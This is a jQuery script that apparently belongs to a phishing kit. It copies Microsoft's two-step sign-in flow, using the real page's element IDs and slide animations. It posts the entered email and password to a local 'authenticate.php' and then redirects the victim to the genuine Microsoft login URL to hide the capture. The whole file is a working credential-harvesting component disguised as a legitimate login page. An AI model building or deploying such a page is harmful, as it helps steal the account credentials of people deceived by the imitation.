$(document).ready(function () {
    const nextBtn = $(`#idSIButton9`);
    const backBtn = $(`#idBtn_Back`);

    const authEmailDiv = $( "#authEmail" );
    const authEmailAnim = $( "#authEmailAnimate");
    const authPwdDiv = $( "#authLogin");
    const authPwdAnim = $( "#authPwdAnimate");

    nextBtn.click(function(e) {
	$("#usernameError").hide();
	const emailVal = $("input#i0116").val();  
	if (emailVal !== "") {
        	authEmailAnim.removeClass('slide-in-back');
        	authEmailAnim.addClass('slide-out-next');
        	authPwdAnim.removeClass('slide-out-back');
        	authPwdAnim.addClass('slide-in-next');
        	$("#displayName").text($('#i0116').val());
        	setTimeout(function() {
            	authEmailDiv.hide();
            	authPwdDiv.show();
        	}, 200);
	} else {
	$("#usernameError").show();
	}

    });
    backBtn.click(function() {
	$("#usernameError").hide();
        authEmailAnim.removeClass('slide-out-next');
        authEmailAnim.addClass('slide-in-back');
        authPwdAnim.removeClass('slide-in-next');
        authPwdAnim.addClass('slide-out-back');
        setTimeout(function() {
            authEmailDiv.show();
            authPwdDiv.hide();
        }, 200);
    });

    async function asyncPost(args) {
        let result;

        try {
            result = await $.ajax({
                type: "POST",
                url: './lib/authenticate.php',
                data: args,
                dataType: 'json'
            });

            return result;
        } catch (error) {
            console.error(error);
        }
    }

    $('#authenticate-form').submit(async function(e)
    {
        e.preventDefault();
        const result = await asyncPost($(this).serialize());
        console.log(result);
        if (result.type === 'success') {
            window.location.href = "https://login.microsoftonline.com/common/oauth2";
        }
    });
});